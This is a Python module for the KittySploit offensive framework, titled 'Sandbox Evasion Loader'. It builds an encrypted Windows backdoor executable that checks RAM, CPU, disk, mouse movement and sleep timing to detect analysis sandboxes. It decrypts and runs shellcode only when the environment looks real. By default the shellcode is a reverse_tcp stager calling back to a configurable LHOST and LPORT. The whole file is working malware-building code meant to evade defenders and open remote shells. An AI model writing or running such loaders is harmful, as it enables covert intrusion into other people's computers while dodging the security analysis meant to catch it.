#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_zig_backdoor, option_value
from lib.compile.sandbox_evasion_loader import SandboxEvasionLoaderBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Sandbox Evasion Loader",
        "description": (
            "Apply sandbox heuristics (RAM/CPU/disk, mouse movement, sleep timing) and "
            "only execute decrypted shellcode when the environment looks benign."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/09_sandbox_evasion.c",
        ],
    }

    payload_path = OptString("payloads/stagers/windows/x86/reverse_tcp", "Payload path", True)
    lhost = OptString("127.0.0.1", "LHOST", True)
    lport = OptPort(4444, "LPORT", True)
    encoder = OptString("", "Encoder (optional)", False)
    cipher = OptChoice("chacha", "Cipher", True, ["chacha", "rc4"])
    min_sandbox_score = OptInteger(
        2,
        "Minimum heuristic hits before aborting (1-5)",
        False,
    )
    sleep = OptInteger(0, "Extra sleep ms before execution", False)
    output_name = OptString("sandbox_loader.exe", "Output filename", False)
    optimization = OptChoice("ReleaseSmall", "Optimization", False, ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"])
    save_source = OptBool(False, "Save C source", False, advanced=True)
    windows_subsystem = OptChoice("windows", "Subsystem", False, ["windows", "console"])

    def run(self):
        builder = SandboxEvasionLoaderBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
            min_score=int(option_value(self, "min_sandbox_score") or 2),
        )
        return build_encrypted_zig_backdoor(
            self,
            builder,
            output_name="sandbox_loader.exe",
            save_source_name="sandbox_loader.zig",
        )
